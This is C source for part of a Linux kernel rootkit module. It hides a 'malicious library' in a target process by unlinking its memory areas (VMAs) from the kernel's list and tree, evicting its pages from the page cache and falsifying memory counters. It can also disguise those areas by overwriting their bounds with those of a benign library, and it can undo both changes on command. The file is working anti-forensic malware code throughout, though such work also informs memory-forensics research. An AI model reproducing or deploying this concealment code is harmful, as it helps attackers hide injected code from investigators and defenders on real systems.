/* vma_modify.c -- deleting the VMAs and modifying the limits of the VMAs
 *
 * Copyright (C) 2019 Patrick Reichenberger
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */
#include <linux/pagemap.h>
#include <linux/slab.h>

#include "rootkit_module.h"
#include "vma_modify.h"
#include "helper.h"
#include "debug.h"

static int vma_rights[] = {(VM_READ | VM_EXEC), 0, VM_READ, (VM_READ | VM_WRITE)};

/* Initialization of an empty linked list to store the hidden entries */
LIST_HEAD(vma_backup_ll);

struct vma_backup_entry_ll *create_vma_backup_entry(const char *filepath, int access_rights, struct vm_area_struct *vma, pte_uint64 vm_start, pte_uint64 vm_end) {
    struct vma_backup_entry_ll *ptr = kmalloc(sizeof(struct vma_backup_entry_ll), GFP_NOWAIT);
    if(ptr) {
        ptr->vma_id.filepath = filepath;
        ptr->vma_id.access_rights = access_rights;
        ptr->vma = vma;
        ptr->vm_start = vm_start;
        ptr->vm_end = vm_end;
    }
    return ptr;
}

/** insert_ll_vma_backup - insert vma_backup_entry in linked list
 *  @filepath: path of VMA
 *  @access_rights: rights of VMA
 *  @vma: pointer to vm_area_struct
 *  @vm_start: start address of VMA
 *  @vm_end: end address of VMA
 *
 *  Inserts a vma_backup_entry into the linked list. If an element with the same key is existent, only the values are
 *  adapted.
 */
int insert_ll_vma_backup(const char *filepath, int access_rights, struct vm_area_struct *vma, pte_uint64 vm_start, pte_uint64 vm_end) {
    /* Check if the VMA with this file path and the access rights is already in the linked list */
    int found_and_changed = 0;
    struct vma_backup_entry_ll *vmabe_ptr = NULL;
    list_for_each_entry(vmabe_ptr, &vma_backup_ll, vma_bck_list) {
        if(!strcmp(vmabe_ptr->vma_id.filepath, filepath) && vmabe_ptr->vma_id.access_rights == access_rights) {
            vmabe_ptr->vma = vma;
            vmabe_ptr->vm_start = vm_start;
            vmabe_ptr->vm_end = vm_end;
            found_and_changed = 1;
        }
    }

    /* If it is not in the linked list, then allocate memory and add into the linked list */
    if(!found_and_changed) {
        struct vma_backup_entry_ll *insert = create_vma_backup_entry(filepath, access_rights, vma, vm_start, vm_end);
        if(!insert) {
            return -1;
        }
        list_add(&insert->vma_bck_list, &vma_backup_ll);
    }
    return 0;
}

/* Lookup a vma_backup_entry in the linked list */
struct vma_backup_entry_ll *lookup_ll_vma_backup(const char *filepath, int access_rights) {
    struct vma_backup_entry_ll *vmabe_ptr = NULL;
    list_for_each_entry(vmabe_ptr, &vma_backup_ll, vma_bck_list) {
        if(!strcmp(vmabe_ptr->vma_id.filepath, filepath) && vmabe_ptr->vma_id.access_rights == access_rights) {
            return vmabe_ptr;
        }
    }
    return NULL;
}

/** own_find_vma_links - find VMA in rb tree
 *
 *  NOTE: This function is copied from the Linux Kernel: /mm/mmap.c - find_vma_links
 *  https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/mm/mmap.c?h=v4.9#n473
 */
static int own_find_vma_links(struct mm_struct *mm, unsigned long addr,
                              unsigned long end, struct vm_area_struct **pprev,
                              struct rb_node ***rb_link, struct rb_node **rb_parent)
{
    struct rb_node **__rb_link, *__rb_parent, *rb_prev;

    __rb_link = &mm->mm_rb.rb_node;
    rb_prev = __rb_parent = NULL;

    while (*__rb_link) {
        struct vm_area_struct *vma_tmp;

        __rb_parent = *__rb_link;
        vma_tmp = rb_entry(__rb_parent, struct vm_area_struct, vm_rb);

        if (vma_tmp->vm_end > addr) {
            /* Fail if an existing vma overlaps the area */
            if (vma_tmp->vm_start < end)
                return -ENOMEM;
            __rb_link = &__rb_parent->rb_left;
        } else {
            rb_prev = __rb_parent;
            __rb_link = &__rb_parent->rb_right;
        }
    }

    *pprev = NULL;
    if (rb_prev)
        *pprev = rb_entry(rb_prev, struct vm_area_struct, vm_rb);
    *rb_link = __rb_link;
    *rb_parent = __rb_parent;
    return 0;
}


/* -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 * -=-=-=-=-=-=-=-=- Delete VMAs -=-=-=-=-=-=-=-=-=-
 * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 */

/** delete_vma - deletes VMA from list and rb tree
 *  @vma: VMA to delete
 *  @pid: PID
 *
 *  Creates a backup entry and deletes the VMA from the linked list and the rb tree.
 *  Initial references to this structure are given in memory descriptor mm.
 *  The pages inside the VMA are deleted from the page cache.
 *
 *  In manual mode, the Resident Set Size (RSS) and map_count of the process is adjusted, as this causes problems
 *  when closing the process and VMAs are deleted.
 */
int delete_vma(struct vm_area_struct *vma, int pid) {
    log_print(LOG_DEBUG, "Delete VMA.");
    struct mm_struct *mm = find_mm(pid);
    int rights = vma->vm_flags & 0x7;

    /* Store the VMA in the backup list to backup original pointer */
    if(!insert_ll_vma_backup(vma->vm_file->f_path.dentry->d_name.name, rights, vma, vma->vm_start, vma->vm_end)) {
        PTE *pte;
        VIRT_ADDR va;
        for(va.value = vma->vm_start; va.value < vma->vm_end; va.value += 4096){
            if(rights != 0) {
                /* Get PTE in &pte for virtual address */
                pte_from_virt_for_pid(va.pointer, &pte, pid);
                own_delete_from_page_cache(pte);
#ifdef MANUAL_MODE
                /* Resident set size */
                if(technique != DELETE_PTES_VMAS) {
                    /* This is not applied for the combination of invalidate the PTEs and then delete the VMAs.
                     * The ptes are for sure invalid, as the are invalidated beforehand. The RSS adjustment
                     * is made in the handler for the technique in that case */
                    modify_rss_stat_count(vma->vm_mm, vma->vm_flags, !pte->present, HIDE);
                }
#endif
            }
        }
#ifdef MANUAL_MODE
        /* Mapcount. Number of VMAs */
        mm->map_count--;
#endif

        /* Delete the VMA from the rb tree */
        if(&vma->vm_rb && &mm->mm_rb) {
            rb_erase(&vma->vm_rb, &mm->mm_rb);
        }
        /* Flush VMA cache */
        memset(mm->owner->vmacache, 0, sizeof(mm->owner->vmacache));

        /* Delete the VMA from the linked list */
        vma->vm_prev->vm_next = vma->vm_next;
        vma->vm_next->vm_prev = vma->vm_prev;

        log_print(LOG_INFO, "Successfully deleted VMA.");
        log_print(LOG_DEBUG, "Path %s | Rights %x | addr %p | start %lx\n-----",
                  vma->vm_file->f_path.dentry->d_name.name, vma->vm_flags, vma, vma->vm_start);
        return 0;
    } else {
        log_print(LOG_ERR, "Failed to delete VMA. Error in linked list insert.");
        return -1;
    }
}

/** restore_vma - restores VMA into linked list and rb tree
 *  @path: path of file the VMA maps
 *  @rights: right of VMA
 *  @pid: PID
 *
 *  Searches the backup list if a VMA is stored with specified file path and rights.
 *  If so, the VMA is inserted in the original linked list an the rb tree.
 *  In manual mode, the Resident Set Size (RSS) and map_count of the process are adjusted as they had to be
 *  changed when deleting the VMA.
 */
struct vm_area_struct *restore_vma(char *path, int rights, int pid) {
    struct vm_area_struct *vma = find_vma_mmap(pid);
    struct mm_struct *mm = find_mm(pid);
    struct vma_backup_entry_ll *obj;

    log_print(LOG_DEBUG, "Restore VMA.");

    /* Check if VMA is stored by the rootkit */
    obj = lookup_ll_vma_backup(path, rights);

    if(obj){
        struct vm_area_struct *to_be_in = (struct vm_area_struct *) obj->vma;
        if(vma) {
            while (vma) {
                if (vma->vm_next && vma->vm_next->vm_start == to_be_in->vm_start) {
                    log_print(LOG_INFO, "Already in VMA list, not restored again.");
                    break;
                }

                if (to_be_in && vma->vm_next && vma->vm_next->vm_start > to_be_in->vm_start) {
                    /* Insert the VMA into the linked list */
                    to_be_in->vm_prev = vma;
                    to_be_in->vm_next = vma->vm_next;
                    vma->vm_next->vm_prev = to_be_in;
                    vma->vm_next = to_be_in;

                    /* Insert the VMA into the rb tree */
                    struct vm_area_struct *prev;
                    struct rb_node **rb_link, *rb_parent;

                    /* Find the location in rb tree to insert the VMA */
                    if(!own_find_vma_links(to_be_in->vm_mm, to_be_in->vm_start, to_be_in->vm_end,
                                           &prev, &rb_link, &rb_parent)) {
                        /* On success, actually inserting it */
                        rb_link_node(&to_be_in->vm_rb, rb_parent, rb_link);
                        rb_insert_color(&to_be_in->vm_rb, &mm->mm_rb);
                    }

#ifdef MANUAL_MODE
                    /* Resident set size counters */
                    PTE *pte;
                    VIRT_ADDR va;
                    for(va.value = to_be_in->vm_start; va.value < to_be_in->vm_end; va.value += 4096){
                        if(rights != 0) {
                            pte_from_virt_for_pid(va.pointer, &pte, pid);
                            if(technique != DELETE_PTES_VMAS) {
                                /* This is not applied for the combination of invalidate the PTEs and then delete the VMAs.
                                 * See in explanation in delete VMA (delete_vma) */
                                modify_rss_stat_count(to_be_in->vm_mm, to_be_in->vm_flags, !pte->present, REVEAL);
                            }
                        }
                    }
                    /* Mapcount. Number of VMAs */
                    mm->map_count++;
#endif
                    log_print(LOG_INFO, "Successfully restored VMA.");
                    log_print(LOG_DEBUG, "Path %s | Rights %x | addr %p | start %lx",
                              to_be_in->vm_file->f_path.dentry->d_name.name, to_be_in->vm_flags, to_be_in,
                              to_be_in->vm_start);
                    break;
                }
                vma = vma->vm_next;
            }
        }
        return to_be_in;
    } else {
        log_print(LOG_ERR, "Failed to restore VMA. Not found in linked list.");
        return NULL;
    }
}

/** vma_delete_handler - handles the technique of deleting VMAs
 *  @mal_lib_path: path of malicious library VMA
 *  @mode: hide or reveal
 *  @pid: PID
 *
 *  Determines the VMAs that are deleted and restored.
 *  In manual mode the nr_ptes is adjusted. This is done here as it is necessary to keep track of previous
 *  values.
 */
void vma_delete_handler(char *mal_lib_path, int mode, int pid) {
#ifdef MANUAL_MODE
    /* Required for nr_ptes adjustment */
    struct mm_struct *mm = find_mm(pid);
    unsigned long last_included = 0;
    struct nr_ptes_vma_track nrPtesTracker;
    int nr_ptes = 0;
#endif

    if (mode == HIDE) {
        int status = -1;
        /* Delete the set of VMAs of the given path.
         * The VMAs are identified by their access rights.
         */
        for (int i = 0; i < sizeof(vma_rights) / sizeof(int); i++) {
            struct vm_area_struct *mal_vma;
            /* Find pointer to the VMA to be deleted */
            mal_vma = find_vma_path_rights(mal_lib_path, vma_rights[i], pid);
            if(mal_vma) {
                status = delete_vma(mal_vma, pid);
            } else {
                log_print(LOG_ERR, "Failed to find malicious VMA for deletion.");
            }

#ifdef MANUAL_MODE
            /* Get nr_ptes to be changed */
            if(mm && !status) {
                nrPtesTracker = adjust_nr_ptes(mal_vma, last_included);
                nr_ptes += nrPtesTracker.nr_ptes;
                last_included = nrPtesTracker.last_included;
            }
#endif
        }

#ifdef MANUAL_MODE
        /* Adjust mm->nr_ptes */
        if(mm)
            atomic_long_sub(nr_ptes, &mm->nr_ptes);
#endif

    } else if(mode == REVEAL) {
        /* Restore the set of VMAs of the given path.
         * The VMAs are identified by their access rights.
         */
        struct vm_area_struct *ins_vma;

        for (int i = 0; i < sizeof(vma_rights) / sizeof(int); i++) {
            /* Restore the specific VMAs */
            ins_vma = restore_vma(mal_lib_path, vma_rights[i], pid);

#ifdef MANUAL_MODE
            /* Get nr_ptes to be changed */
            if(mm && ins_vma) {
                nrPtesTracker = adjust_nr_ptes(ins_vma, last_included);
                nr_ptes += nrPtesTracker.nr_ptes;
                last_included = nrPtesTracker.last_included;
            }
#endif
        }
#ifdef MANUAL_MODE
        /* Adjust mm->nr_ptes */
        if(mm) {
            atomic_long_add(nr_ptes, &mm->nr_ptes);
        }
#endif
    } else {
        log_print(LOG_ERR, "Invalid mode");
    }
}


/* -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 * -=-=-=-=-=-=-= Tamper VMA bounds =-=-=-=-=-=-=-=-
 * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 */

/** tamper_vma_bounds - modifies the limits of VMAs to limits of other VMAs
 *  @mal_vma: VMA whose limits to change
 *  @benign_vma: VMA whose limits are taken
 *  @pid: PID
 *
 *  Create backup entry with the original start and end address and change the start and end address
 *  of the vm_area_struct of the malicious VMA to the start and end address of a benign VMA.
 *  The pages inside the VMA are deleted from the page cache.
 *  In manual mode, the Resident Set Size (RSS) of the process is adjusted, as this causes problems
 *  when closing the process and VMAs are deleted.
 */
int tamper_vma_bounds(struct vm_area_struct *mal_vma, struct vm_area_struct *benign_vma, int pid) {
    PTE *pte;
    VIRT_ADDR va;

    log_print(LOG_INFO, "Tampering VMA bounds");

    /* Store the VMA in the backup list to backup original start and end address */
    if(!insert_ll_vma_backup(mal_vma->vm_file->f_path.dentry->d_name.name, mal_vma->vm_flags, mal_vma, mal_vma->vm_start, mal_vma->vm_end)) {

        for(va.value = mal_vma->vm_start; va.value < mal_vma->vm_end; va.value += 4096){
            if((mal_vma->vm_flags & 0x7) != 0) {
                /* Get PTE in &pte for virtual address */
                pte_from_virt_for_pid(va.pointer, &pte, pid);
                own_delete_from_page_cache(pte);
#ifdef MANUAL_MODE
                /* Resident set size */
                modify_rss_stat_count(mal_vma->vm_mm, mal_vma->vm_flags, 0, 0);
#endif
            }
        }

        /* Modify the limits */
        mal_vma->vm_start = benign_vma->vm_start;
        mal_vma->vm_end = benign_vma->vm_end;

        log_print(LOG_INFO, "Successfully tampered VMA bounds.");
        log_print(LOG_DEBUG, "Path %s | start %lx | end %lx\n"
                             "--> To start %lx | end %lx",
                  mal_vma->vm_file->f_path.dentry->d_name.name, mal_vma->vm_start, mal_vma->vm_end,
                  benign_vma->vm_start, benign_vma->vm_end);


        return 0;
    } else {
        log_print(LOG_ERR, "Failed to tamper VMA bounds. Error in linked list insert.");
        return -1;
    }
}

/** reset_vma_bounds - resets the limits of VMAs
 *  @mal_vma: VMA whose limits to reset
 *
 *  Check if backup entry for given VMA is existent and if so, restore the original limits.
 *  In manual mode, the Resident Set Size (RSS) of the process is adjusted, as it had to be
 *  changed when modifying the VMA limits.
 */
int reset_vma_bounds(struct vm_area_struct *mal_vma) {
    struct vma_backup_entry_ll *obj;


    log_print(LOG_INFO, "Reset VMA bounds");

    /* Check if VMA is stored by the rootkit */
    obj = lookup_ll_vma_backup(mal_vma->vm_file->f_path.dentry->d_name.name, mal_vma->vm_flags);
    if(obj) {

        /* Reset the limits */
        mal_vma->vm_start = obj->vm_start;
        mal_vma->vm_end = obj->vm_end;

#ifdef MANUAL_MODE
        /* Resident set size */
        VIRT_ADDR va;
        for(va.value = mal_vma->vm_start; va.value < mal_vma->vm_end; va.value += 4096){
                modify_rss_stat_count(mal_vma->vm_mm, mal_vma->vm_flags, 0, 1);
        }
#endif

        log_print(LOG_INFO, "Successfully reset VMA bounds.");
        log_print(LOG_DEBUG, "Path '%s' | Rights %d | Start: %lx | End %lx",
                  mal_vma->vm_file->f_path.dentry->d_name.name, mal_vma->vm_flags, mal_vma->vm_start, mal_vma->vm_end);
        return 0;
    } else {
        log_print(LOG_ERR, "Failed to reset VMA bounds. Not found in linked list.");
        return -1;
    }
}

/** vma_modify_handler - handles the technique of modifying VMAs limits
 *  @mal_lib_path: path of malicious library VMAs
 *  @benign_lib_path: path of benign library VMAs
 *  @mode: hide or reveal
 *  @pid: PID
 *
 *  Determines the malicious VMAs whose limits are to be changed and the benign VMAs to which the limits are changed.
 *
 */
void vma_modify_handler(char *mal_lib_path, char *benign_lib_path, int mode, int pid) {
    struct vm_area_struct *mal_vma;

    if (mode == HIDE) {
        struct vm_area_struct *benign_vma;

        /* Modify the limits of the VMAs with the given path.
         * The VMAs are identified by their access rights.
         */
        for (int i = 0; i < sizeof(vma_rights) / sizeof(int); i++) {
            /* Find the pointer to VMA of the malicious library whose limits are to be modified and the benign library.*/
            mal_vma = find_vma_path_rights(mal_lib_path, vma_rights[i], pid);
            benign_vma = find_vma_path_rights(benign_lib_path, vma_rights[i], pid);
            if (mal_vma && benign_vma) {
                tamper_vma_bounds(mal_vma, benign_vma, pid);
            } else {
                log_print(LOG_ERR, "Failed to find malicious or benign VMA for limit modification.");
            }
        }
    } else if(mode == REVEAL){
        /* Reset the limits of the VMAs with the given path.
         * The VMAs are identified by their access rights.
         */
        for (int i = 0; i < sizeof(vma_rights) / sizeof(int); ++i) {
            /* Find the pointer to VMA of the malicious library whose limits are to be restored. */
            mal_vma = find_vma_path_rights(mal_lib_path, vma_rights[i], pid);
            if (mal_vma) {
                reset_vma_bounds(mal_vma);
            } else {
                log_print(LOG_ERR, "Failed to find malicious VMA for limit reset.");
            }
        }
    } else {
        log_print(LOG_ERR, "Invalid mode");
    }
}